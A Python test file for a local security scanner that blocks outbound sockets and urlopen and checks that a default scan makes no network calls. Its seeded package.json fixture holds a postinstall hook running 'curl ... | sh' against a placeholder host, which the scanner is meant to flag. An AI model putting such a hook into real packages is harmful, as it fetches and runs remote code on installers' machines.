"""Repo-wide no-egress sentinel for the default-path scan pipeline.

DëvSec is local-first: a default scan must never make an outbound network call.
This sentinel arms a hard block on internet-family sockets and ``urlopen``, then
drives a full default-path scan -> normalize -> case-build and asserts the pipeline
completes with zero outbound attempts.

Scope is the in-process Python pipeline (the lens-report evidence and the part this
guard can actually police). External scanner binaries run out-of-process and are a
separate trust boundary, so they are deliberately forced to skip here rather than
shelling out — the guard could not observe a child process's sockets anyway. Network
opt-ins (`--trust`, behavioral-drift, platform-posture) are off on the default path
and stay untouched. Adding a default-path network call anywhere in the Python
pipeline trips the sentinel and fails this test.
"""
from __future__ import annotations

import socket
import urllib.request
from pathlib import Path

import pytest

from security_observatory.cli import build_parser, scan_repo


class _EgressAttempt(RuntimeError):
    """Raised when code under the sentinel tries to reach the network."""


def _arm_sentinel(monkeypatch) -> list[tuple[str, object]]:
    """Block outbound network access and record any attempt.

    Internet-family sockets (AF_INET/AF_INET6) and ``urllib.request.urlopen`` raise.
    Non-network socket families (e.g. AF_UNIX) are left alone so that legitimate
    local IPC is not misread as egress.
    """
    attempts: list[tuple[str, object]] = []
    real_socket = socket.socket

    def blocked_socket(family=socket.AF_INET, type=socket.SOCK_STREAM, *args, **kwargs):
        if family in (socket.AF_INET, socket.AF_INET6):
            attempts.append(("socket", family))
            raise _EgressAttempt("outbound socket blocked by no-egress sentinel")
        return real_socket(family, type, *args, **kwargs)

    def blocked_create_connection(*args, **kwargs):
        attempts.append(("create_connection", args[:1]))
        raise _EgressAttempt("outbound connection blocked by no-egress sentinel")

    def blocked_urlopen(*args, **kwargs):
        attempts.append(("urlopen", args[:1]))
        raise _EgressAttempt("urlopen blocked by no-egress sentinel")

    monkeypatch.setattr(socket, "socket", blocked_socket)
    monkeypatch.setattr(socket, "create_connection", blocked_create_connection)
    monkeypatch.setattr(urllib.request, "urlopen", blocked_urlopen)
    # Force external scanner binaries to report unavailable so the default profile
    # exercises the in-process pipeline (built-in scanners -> normalize -> cases ->
    # local IOC packs -> scoring -> SQLite) without shelling out to real tools.
    monkeypatch.setattr("security_observatory.scanners.shutil.which", lambda *a, **k: None)
    return attempts


def _seed_repo(repo: Path) -> None:
    """Drop a file the built-in install-hook scanner flags, so the pipeline carries
    real findings through normalize and case-build rather than running empty."""
    repo.mkdir(parents=True, exist_ok=True)
    (repo / "package.json").write_text(
        '{\n'
        '  "name": "egress-fixture",\n'
        '  "version": "1.0.0",\n'
        '  "scripts": {\n'
        '    "postinstall": "curl -sSL https://example.invalid/install.sh | sh"\n'
        '  }\n'
        '}\n',
        encoding="utf-8",
    )


def test_sentinel_actually_blocks_egress(monkeypatch):
    """Guard the guard: prove the sentinel trips on a real outbound attempt, so the
    main test below cannot pass vacuously by simply never being armed."""
    _arm_sentinel(monkeypatch)
    with pytest.raises(_EgressAttempt):
        socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    with pytest.raises(_EgressAttempt):
        urllib.request.urlopen("http://example.invalid")


def test_default_path_scan_makes_no_network_calls(tmp_path, monkeypatch):
    repo = tmp_path / "egress-fixture"
    _seed_repo(repo)
    home = tmp_path / "home"
    home.mkdir()

    args = build_parser().parse_args([str(repo)])
    assert not args.trust and not args.behavioral_drift and not args.platform_posture

    attempts = _arm_sentinel(monkeypatch)

    report = scan_repo(repo, args, home)

    # The full default-path scan completed without a single outbound attempt.
    assert attempts == [], f"default-path scan attempted egress: {attempts}"
    # And it really did run the pipeline end to end.
    assert report["status"] in {"ok", "partial"}
    assert "cases" in report and "findings" in report
